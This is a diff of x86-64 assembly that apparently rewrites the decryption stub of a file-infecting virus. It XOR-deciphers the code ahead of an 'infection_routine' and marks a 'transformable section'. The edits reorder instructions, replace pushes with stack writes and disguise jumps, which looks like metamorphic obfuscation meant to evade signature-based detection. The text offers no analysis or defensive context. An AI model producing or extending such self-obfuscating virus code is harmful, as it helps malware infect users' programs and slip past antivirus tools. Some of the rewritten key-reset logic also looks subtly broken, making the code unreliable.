@@ -9,61 +9,63 @@ _start:
 
 begin:
 	; save all registers
-	push rax
-	push rdi
-	push rsi
-	push rdx
-	push rcx
-	push rbx
-	push r8
-	push r9
-	push r10
-	push r11
+push rax
+sub rsp, 24
+mov [rsp + 8], rsi
+mov [rsp + 16], rdi
+mov [rsp], rdx
+push rcx
+push rbx
+sub rsp, 32
+mov [rsp], r11
+mov [rsp + 16], r9
+mov [rsp + 24], r8
+mov [rsp + 8], r10
 
 	; uncipher first part of the code
-	lea rdi, [rel program_entry]			; data = &program_entry
-	mov rsi, infection_routine - program_entry	; size = infection_routine - program_entry
-	lea rdx, [rel key]				; key = key
 	mov rcx, [rel key_size]				; key_size = key_size
+	lea rdx, [rel key]				; key = key
+	mov rsi, infection_routine - program_entry	; size = infection_routine - program_entry
+	lea rdi, [rel program_entry]			; data = &program_entry
 	cmp rcx, 0					; if (key_size == 0)
 	je program_entry				; 	goto program_entry
 	call xor_cipher					; xor_cipher(data, size, key, key_size)
 
-	jmp program_entry				; goto program_entry
+cmp rax, rax
+je program_entry				; goto program_entry
 
 ; void xor_cipher(char *data, int size, char *key, int key_size);
 ; xor_cipher(rdi data, rsi size, rdx key, rcx key_size);
 xor_cipher:
 	push rcx					; save key_size
-	push rdx					; save key
 
 	.loop:
+		cmp rcx, 0				; if (key_size == 0)
+		je .key_reset				; 	goto .key_reset
+
 		cmp rsi, 0				; if (size == 0)
 		je .end					; 	goto .end
 
-		mov al, [rdi]				; al = *data
-		mov bl, [rdx]				; bl = *key
-		xor al, bl				; al ^= bl
-		mov [rdi], al				; *data = al
+		mov r8b, [rdi]				; al = *data
+		mov r9b, [rdx]				; bl = *key
+		xor r8b, r9b				; al ^= bl
+		mov [rdi], r8b				; *data = al
 
-		inc rdi					; data++
-		inc rdx					; key++
 		dec rsi					; size--
+		inc rdx					; key++
+		inc rdi					; data++
 		dec rcx					; key_size--
-
-		cmp rcx, 0				; if (key_size == 0)
-		je .key_reset				; 	goto .key_reset
 
 		jmp .loop				; goto .loop
 
 	.key_reset:
-		mov rdx, [rsp]				; restore key
-		mov rcx, [rsp + 8]			; ...
+		pop rcx					; restore key_size
+		push rcx				; ...
+		sub rdx, rcx			; restore key
 		jmp .loop				; goto .loop
 
 	.end:
-		pop rdx					; reset stack
-		pop rcx					; ...
+		pop rcx					; reset stack
 		ret					; return
 ; TODO end transformable section
 
